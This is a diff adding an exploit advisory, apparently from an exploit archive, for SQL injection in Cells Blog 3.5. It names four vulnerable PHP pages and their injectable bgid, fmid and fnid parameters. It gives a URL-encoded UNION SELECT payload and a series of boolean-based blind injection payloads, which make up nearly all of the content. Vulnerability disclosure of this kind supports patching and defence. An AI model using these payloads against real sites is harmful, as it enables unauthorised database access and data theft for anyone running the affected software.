@@ -1,0 +1,79 @@
+# # # # #
+# Exploit Title: Cells Blog 3.5 - SQL Injection
+# Dork: N/A
+# Date: 16.12.2017
+# Vendor Homepage: http://www.cells.tw/
+# Software Link: http://www.cells.tw/cells/
+# Version: 3.5
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+# # # # #
+# Exploit Author: Ihsan Sencan
+# Author Web: http://ihsan.net
+# Author Social: @ihsansencan
+# # # # #
+# Description:
+# The vulnerability allows an attacker to inject sql commands....
+# 
+# Proof of Concept: 
+# 
+# 1)
+# http://localhost/[PATH]/pub_post.php?bgid=[SQL]&fmid=[SQL]
+#  
+# -7+UNION%20SELECT+0x253331%2c0x253332%2c0x253333%2c0x253334%2c0x253335%2c0x253336%2c0x253337%2c0x253338%2c%39%2c0x253331253330%2c0x253331253331%2c0x253331253332%2c0x253331253333%2c0x253331253334%2c0x253331253335%2c0x253331253336%2c0x253331253337%2c0x253331253338%2c0x253331253339%2d%2d%20%2d
+# 
+# Parameter: bgid (GET)
+#     Type: boolean-based blind
+#     Title: AND boolean-based blind - WHERE or HAVING clause
+#     Payload: bgid=1 AND 9841=9841&fmid=7
+# 
+# Parameter: fmid (GET)
+#     Type: boolean-based blind
+#     Title: AND boolean-based blind - WHERE or HAVING clause
+#     Payload: bgid=1&fmid=7 AND 2056=2056
+# 2) 
+# http://localhost/[PATH]/pub_openpic.php?bgid=[SQL]&fmid=[SQL]&fnid=[SQL]
+# 
+# Parameter: fnid (GET)
+#     Type: boolean-based blind
+#     Title: AND boolean-based blind - WHERE or HAVING clause
+#     Payload: bgid=2&fmid=10&fnid=12 AND 1592=1592
+# 
+# Parameter: fmid (GET)
+#     Type: boolean-based blind
+#     Title: AND boolean-based blind - WHERE or HAVING clause
+#     Payload: bgid=2&fmid=10 AND 3227=3227&fnid=12
+# 
+# Parameter: bgid (GET)
+#     Type: boolean-based blind
+#     Title: AND boolean-based blind - WHERE or HAVING clause
+#     Payload: bgid=2 AND 6608=6608&fmid=10&fnid=12
+# 
+# 3) 
+# http://localhost/[PATH]/album.php?bgid=[SQL]&fmid=[SQL]
+# 
+# Parameter: fmid (GET)
+#     Type: boolean-based blind
+#     Title: AND boolean-based blind - WHERE or HAVING clause
+#     Payload: bgid=2&fmid=10 AND 9273=9273
+# 
+# Parameter: bgid (GET)
+#     Type: boolean-based blind
+#     Title: AND boolean-based blind - WHERE or HAVING clause
+#     Payload: bgid=2 AND 9536=9536&fmid=10
+# 
+# 4)
+# http://localhost/[PATH]/fourm.php?bgid=[SQL]&fmid=[SQL]
+# 
+# Parameter: fmid (GET)
+#     Type: boolean-based blind
+#     Title: AND boolean-based blind - WHERE or HAVING clause
+#     Payload: bgid=1&fmid=2 AND 5699=5699
+# 
+# Parameter: bgid (GET)
+#     Type: boolean-based blind
+#     Title: AND boolean-based blind - WHERE or HAVING clause
+#     Payload: bgid=1 AND 9899=9899&fmid=2
+# 
+# # # # #
